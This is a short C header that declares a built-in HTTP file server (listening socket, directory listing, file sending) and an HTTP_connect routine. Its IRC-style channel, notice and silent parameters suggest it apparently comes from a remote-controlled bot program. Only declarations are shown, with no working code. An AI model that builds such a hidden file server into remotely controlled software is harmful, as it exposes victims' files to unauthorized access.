#ifndef NO_HTTPD
typedef struct HTTPD 
{
	SOCKET sock;
	BOOL type;
	BOOL info;
	char file[MAX_PATH];
	char path[MAX_PATH];
	int length;

} HTTPD;

SOCKET Listen(int port);
int HTTP_server(char *IP, int port, char *dir, BOOL dirinfo=TRUE);
DWORD WINAPI HTTP_server_thread(LPVOID Param);
int Check_Requestedfile(SOCKET sock, char *dir, char *rFile, BOOL dirinfo);
int getfiles(char *current, SOCKET sock, char *chan, char *URL);
DWORD WINAPI  http_header(LPVOID param);
void http_send_file(SOCKET sock, char *file);
char *file_to_html(char *file);
void HTTP_connect(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *host, int port, char *method, char *url, char *referer);
#endif